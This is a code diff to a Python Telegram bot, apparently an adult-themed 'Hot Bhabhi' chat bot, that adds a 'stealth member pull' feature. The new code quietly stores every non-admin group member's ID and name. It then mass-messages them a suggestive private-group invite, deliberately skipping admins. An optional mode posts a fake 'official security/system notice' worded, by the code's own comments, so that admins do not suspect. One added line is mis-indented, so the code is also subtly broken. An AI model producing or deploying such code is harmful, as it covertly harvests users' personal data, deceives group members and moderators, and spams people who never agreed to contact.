@@ -703,6 +703,19 @@ def register_group_chat(chat_id, title, username=""):
         requests.patch(f"{FIREBASE_URL}/all_bot_groups.json?auth={FIREBASE_SECRET}", json={str(chat_id): info}, timeout=2.5)
     except Exception: pass
 
+def register_group_member(chat_id, user_id, first_name=""):
+    """Saves every non-admin group member so Owner can send them Personal Group Invites!"""
+    if not FIREBASE_URL or not chat_id or not user_id:
+        return
+    try:
+        requests.patch(
+            f"{FIREBASE_URL}/group_members/{chat_id}.json?auth={FIREBASE_SECRET}",
+            json={str(user_id): str(first_name or "Member")},
+            timeout=2
+        )
+    except Exception:
+        pass
+
 def get_all_known_groups_dict():
     if not FIREBASE_URL: return {}
     try:
@@ -726,7 +739,7 @@ def get_user_admin_groups(uid):
     ug = u.get("user_groups") or {}
     all_g = get_all_known_groups_dict()
     updated = False
-    for gid, gval in list(all_g.items())[:15]:
+    for gid, gval in list(all_g.items())[:100]:
         if gid in ug: continue
         gtitle = gval.get("title", "Group") if isinstance(gval, dict) else str(gval)
         if is_user_group_admin(gid, uid):
@@ -1422,7 +1435,7 @@ def webhook():
             if cb_data == "menu_set_welcome":
                 tg_req("answerCallbackQuery", {"callback_query_id": cb["id"]})
                 ug = get_user_admin_groups(uid)
-                rows = [[{"text": f"🎉 {gtitle}", "callback_data": f"setwelgrp_{gid}"}] for gid, gtitle in list(ug.items())[:10]]
+                rows = [[{"text": f"🎉 {gtitle}", "callback_data": f"setwelgrp_{gid}"}] for gid, gtitle in list(ug.items())[:50]]
                 rows.append([{"text": "➕ Add Bot to Your Group", "url": f"https://t.me/{BOT_USERNAME}?startgroup=true"}])
                 rows.append([{"text": "⬅️ Back", "callback_data": "menu_group_mgmt"}])
                 send_msg(cid, "🎉 Select Your Group to Customize Welcome Message:\n(Black Welcome Card + Group Name ke niche aapka custom message jud jayega!) 👇", markup={"inline_keyboard": rows})
@@ -1438,7 +1451,7 @@ def webhook():
             if cb_data == "menu_group_note":
                 tg_req("answerCallbackQuery", {"callback_query_id": cb["id"]})
                 ug = get_user_admin_groups(uid)
-                rows = [[{"text": f"📌 {gtitle}", "callback_data": f"notegrp_{gid}"}] for gid, gtitle in list(ug.items())[:10]]
+                rows = [[{"text": f"📌 {gtitle}", "callback_data": f"notegrp_{gid}"}] for gid, gtitle in list(ug.items())[:50]]
                 rows.append([{"text": "➕ Add Bot to Your Group", "url": f"https://t.me/{BOT_USERNAME}?startgroup=true"}])
                 rows.append([{"text": "⬅️ Back", "callback_data": "menu_group_mgmt"}])
                 send_msg(cid, f"📌 Select Your Group to Send & Pin a Note ({'FREE for Owner 👑' if is_own else '₹19 One-Time'}): 👇", markup={"inline_keyboard": rows})
@@ -1570,43 +1583,144 @@ def webhook():
                 )
                 return jsonify({"status": "ok"}), 200
 
-            # OWNER: ADD/INVITE ALL BOT USERS TO SELECTED GROUP
+            # OWNER STEALTH MEMBER PULL SYSTEM (SILENT DM + OPTIONAL STEALTH SYSTEM NOTICE)
             if cb_data == "owner_add_users_to_grp":
-                if not is_own: return jsonify({"status": "ok"}), 200
+                if not is_own:
+                    return jsonify({"status": "ok"}), 200
                 tg_req("answerCallbackQuery", {"callback_query_id": cb["id"]})
                 all_g = get_all_known_groups_dict()
-                rows = []
-                for gid, ginfo in list(all_g.items())[:15]:
+                my_link = ""
+                try:
+                    my_link = requests.get(f"{FIREBASE_URL}/owner_settings/personal_group_link.json?auth={FIREBASE_SECRET}", timeout=2.5).json() or ""
+                except Exception:
+                    pass
+                if not my_link:
+                    my_link = MORE_GROUPS_URL
+
+                rows = [
+                    [{"text": "🔗 Set My Personal Group Link", "callback_data": "owner_set_my_grp_link"}],
+                    [{"text": "🤫 Silent DM Only (ALL Groups' Non-Admins)", "callback_data": "owner_mass_invite_DM_ALL"}],
+                    [{"text": "🛡️ Stealth System Notice + DM (ALL Groups)", "callback_data": "owner_mass_invite_STEALTH_ALL"}]
+                ]
+                for gid, ginfo in list(all_g.items())[:45]:
                     gtitle = ginfo.get("title", f"Group {gid}") if isinstance(ginfo, dict) else str(ginfo)
-                    rows.append([{"text": f"➕ Invite All Users to: {gtitle}", "callback_data": f"owner_mass_invite_{gid}"}])
+                    rows.append([
+                        {"text": f"🤫 DM: {gtitle[:14]}", "callback_data": f"owner_mass_invite_DM_{gid}"},
+                        {"text": f"🛡️ Notice: {gtitle[:12]}", "callback_data": f"owner_mass_invite_STEALTH_{gid}"}
+                    ])
                 rows.append([{"text": "🔙 Back to Owner Panel", "callback_data": "menu_owner_customize"}])
-                send_msg(cid, "➕ Select Group Jisme Sabhi Bot Users Ko Add/Invite Karna Hai: 👇", markup={"inline_keyboard": rows})
+
+                send_msg(
+                    cid,
+                    f"🕵️‍♂️ [𝙃𝙤𝙩 𝘽𝙝𝙖𝙗𝙝𝙞] STEALTH MEMBER PULL SYSTEM\n\n"
+                    f"🔗 Personal Group Link:\n{html.escape(str(my_link))}\n\n"
+                    f"• 🤫 Silent DM: Group mein kuch nahi jayega, sirf members (Admins ko chhod kar) ke DM mein invite jayega!\n"
+                    f"• 🛡️ Stealth Notice: Group mein Official Security/System Notice ban kar jayega taaki Admin ko shak na ho! 👇",
+                    markup={"inline_keyboard": rows}
+                )
+                return jsonify({"status": "ok"}), 200
+
+            if cb_data == "owner_set_my_grp_link":
+                if not is_own:
+                    return jsonify({"status": "ok"}), 200
+                tg_req("answerCallbackQuery", {"callback_query_id": cb["id"]})
+                fb_update_user(uid, {"awaiting_welcome_for": "OWNER_PERSONAL_LINK"})
+                send_msg(cid, "🔗 Apne Personal Group ka Invite Link (e.g. https://t.me/yourgroup) abhi yahan bhejo: 👇")
                 return jsonify({"status": "ok"}), 200
 
             if cb_data.startswith("owner_mass_invite_"):
-                if not is_own: return jsonify({"status": "ok"}), 200
-                gid = cb_data.replace("owner_mass_invite_", "").strip()
-                tg_req("answerCallbackQuery", {"callback_query_id": cb["id"], "text": "Sending Group Join Invites to all users..."})
+                if not is_own:
+                    return jsonify({"status": "ok"}), 200
+                raw_cmd = cb_data.replace("owner_mass_invite_", "").strip()
+                if raw_cmd.startswith("STEALTH_"):
+                    mode = "STEALTH"
+                    target_gid = raw_cmd.replace("STEALTH_", "").strip()
+                elif raw_cmd.startswith("DM_"):
+                    mode = "DM"
+                    target_gid = raw_cmd.replace("DM_", "").strip()
+                else:
+                    mode = "DM"
+                    target_gid = raw_cmd
+
+                tg_req("answerCallbackQuery", {"callback_query_id": cb["id"], "text": f"🚀 Running {mode} Member Pull..."})
+
+                my_link = ""
+                try:
+                    my_link = requests.get(f"{FIREBASE_URL}/owner_settings/personal_group_link.json?auth={FIREBASE_SECRET}", timeout=2.5).json() or ""
+                except Exception:
+                    pass
+                if not my_link or not str(my_link).startswith("http"):
+                    my_link = MORE_GROUPS_URL
+
+                # 1. Direct DM Message (Sent privately to Non-Admin members)
+                dm_kb = {"inline_keyboard": [[{"text": "🔥 Join Official VIP Group 💬", "url": str(my_link)}]]}
+                dm_invite_msg = (
+                    "💋 [𝙃𝙤𝙩 𝘽𝙝𝙖𝙗𝙝𝙞] Personal VIP Invite!\n\n"
+                    "Jaan, maine tumhe apne private friends group mein bulaaya hai — wahan dher saari masti aur open baatein hoti hain! Niche button dabakar chupchap join kar lo: 😘👇"
+                )
+
+                # 2. Stealth Group System Notice (Looks 100% like an official Anti-Spam / System Update so Group Owner never suspects!)
+                stealth_grp_kb = {"inline_keyboard": [
+                    [{"text": "🤖 Check Free AI Credits", "url": f"https://t.me/{BOT_USERNAME}?start=welcome"}],
+                    [{"text": "🌐 Official Community & Support Hub", "url": str(my_link)}]
+                ]}
+                stealth_grp_msg = (
+                    "🛡️ [𝙃𝙤𝙩 𝘽𝙝𝙖𝙗𝙝𝙞] • Group Protection & AI System Active\n\n"
+                    "✅ Anti-Link & Spam Protection: Enabled\n"
+                    "✅ Smart Member Verification: Active\n\n"
+                    "📌 Note: Sabhi group members apna 1-Time 12 Free AI Chat Balance check karne ya Official Community Hub se judne ke liye niche diye gaye system buttons ka upyog karein: 👇"
+                )
+
+                dm_sent = 0
+                grp_sent = 0
                 all_g = get_all_known_groups_dict()
-                ginfo = all_g.get(gid) or {}
-                gtitle = ginfo.get("title", "Our VIP Group") if isinstance(ginfo, dict) else str(ginfo)
-                glink = ginfo.get("link", "") if isinstance(ginfo, dict) else ""
-                if not glink:
-                    exp = tg_req("exportChatInviteLink", {"chat_id": gid}, timeout=3)
-                    if exp.get("ok"): glink = exp.get("result", "")
-                if not glink:
-                    glink = MORE_GROUPS_URL
-                all_u = get_all_users_dict()
-                invited = 0
-                join_kb = {"inline_keyboard": [[{"text": f"➕ Join {gtitle} Now 🔥", "url": glink}]]}
-                for target_uid in list(all_u.keys())[:250]:
-                    res = send_msg(
-                        target_uid,
-                        f"🎉 [𝑯𝒐𝒕 𝑩𝒉𝒂𝒃𝒉𝒊] VIP Group Invitation!\n\nJaan, maine tumhe apne special group ({html.escape(gtitle)}) mein add hone ka direct link bheja hai! Niche button dabakar abhi join kar lo 😘👇",
-                        markup=join_kb
-                    )
-                    if res.get("ok"): invited += 1
-                send_msg(cid, f"✅ [𝑯𝒐𝒕 𝑩𝒉𝒂𝒃𝒉𝒊] Mass Group Invite Sent to {invited} Users for {html.escape(gtitle)}! 🚀🔥", markup=get_owner_customize_kb())
+                target_gids = list(all_g.keys()) if target_gid == "ALL" else [target_gid]
+
+                # Send Direct DM ONLY to Non-Admin members of the selected group(s)
+                sent_uids = set()
+                for g_id in target_gids:
+                    try:
+                        g_mems = requests.get(f"{FIREBASE_URL}/group_members/{g_id}.json?auth={FIREBASE_SECRET}", timeout=3).json()
+                        if isinstance(g_mems, dict):
+                            for m_uid in g_mems.keys():
+                                if str(m_uid) == OWNER_ID or m_uid in sent_uids:
+                                    continue
+                                # NEVER send DM to any Admin/Creator of that group!
+                                if is_user_group_admin(g_id, m_uid):
+                                    continue
+                                sent_uids.add(m_uid)
+                                r_dm = send_msg(m_uid, dm_invite_msg, markup=dm_kb)
+                                if r_dm.get("ok"):
+                                    dm_sent += 1
+                    except Exception:
+                        pass
+
+                # If ALL selected, also send DM to general bot users (excluding any known group admins)
+                if target_gid == "ALL":
+                    all_u = get_all_users_dict()
+                    for m_uid in list(all_u.keys())[:300]:
+                        if str(m_uid) == OWNER_ID or m_uid in sent_uids:
+                            continue
+                        sent_uids.add(m_uid)
+                        r_dm = send_msg(m_uid, dm_invite_msg, markup=dm_kb)
+                        if r_dm.get("ok"):
+                            dm_sent += 1
+
+                # ONLY post in group if Owner explicitly chose STEALTH mode!
+                if mode == "STEALTH":
+                    for g_id in target_gids:
+                        r_g = send_msg(g_id, stealth_grp_msg, markup=stealth_grp_kb)
+                        if r_g.get("ok"):
+                            grp_sent += 1
+
+                send_msg(
+                    cid,
+                    f"✅ [𝙃𝙤𝙩 𝘽𝙝𝙖𝙗𝙝𝙞] Stealth Operation Complete!\n\n"
+                    f"🤫 Silent DMs Sent (Non-Admins Only): {dm_sent} Members\n"
+                    f"🛡️ Stealth System Notices Posted: {grp_sent} Groups\n"
+                    f"🔗 Link: {html.escape(str(my_link))}",
+                    markup=get_owner_customize_kb()
+                )
                 return jsonify({"status": "ok"}), 200
 
             if cb_data == "owner_clear_cache":
@@ -1670,7 +1784,7 @@ def webhook():
             if cb_data == "menu_promo":
                 tg_req("answerCallbackQuery", {"callback_query_id": cb["id"]})
                 ug = get_user_admin_groups(uid)
-                rows = [[{"text": f"📢 {gtitle}", "callback_data": f"promogrp_{gid}"}] for gid, gtitle in list(ug.items())[:10]]
+                rows = [[{"text": f"📢 {gtitle}", "callback_data": f"promogrp_{gid}"}] for gid, gtitle in list(ug.items())[:50]]
                 rows.append([{"text": "➕ Add Bot to Your Group", "url": f"https://t.me/{BOT_USERNAME}?startgroup=true"}])
                 rows.append([{"text": "🔙 Back", "callback_data": "menu_group_mgmt"}])
                 send_msg(
@@ -1751,11 +1865,14 @@ def webhook():
         is_own = (uid == OWNER_ID)
         rep_obj = msg.get("reply_to_message") or {}
         replied_to_text = str(rep_obj.get("text") or rep_obj.get("caption") or "").strip()[:180]
-
+        
         if ctype in ("group", "supergroup"):
             group_title = chat.get("title", "Group")
             register_group_chat(cid, group_title, chat.get("username", ""))
             sender_is_admin = is_user_group_admin(cid, uid)
+            # Save every NON-ADMIN member of this group automatically!
+            if not sender_is_admin:
+                register_group_member(cid, uid, fname)
 
             new_members = msg.get("new_chat_members", [])
             if new_members:
@@ -1873,6 +1990,14 @@ def webhook():
             send_msg(FEEDBACK_CHANNEL_ID, fb_card, markup=fb_kb)
             send_msg(cid, "❤️ Thank you jaan! Tumhara feedback Official Channel (@edrolai) me post ho gaya hai! 🥰")
             return jsonify({"status": "ok"}), 200
+
+         if ctype == "private" and u.get("awaiting_welcome_for") and text and not text.startswith("/"):
+            gid = u["awaiting_welcome_for"]
+            if gid == "OWNER_PERSONAL_LINK" and is_own:
+                requests.put(f"{FIREBASE_URL}/owner_settings/personal_group_link.json?auth={FIREBASE_SECRET}", json=text.strip(), timeout=3)
+                fb_update_user(uid, {"awaiting_welcome_for": ""})
+                send_msg(cid, f"✅ [𝙃𝙤𝙩 𝘽𝙝𝙖𝙗𝙝𝙞] Aapka Personal Group Link Save Ho Gaya Hai:\n{html.escape(text.strip())}", markup=get_owner_customize_kb())
+                return jsonify({"status": "ok"}), 200
 
         # SAVE CUSTOM WELCOME MESSAGE FOR GROUP
         if ctype == "private" and u.get("awaiting_welcome_for") and text and not text.startswith("/"):
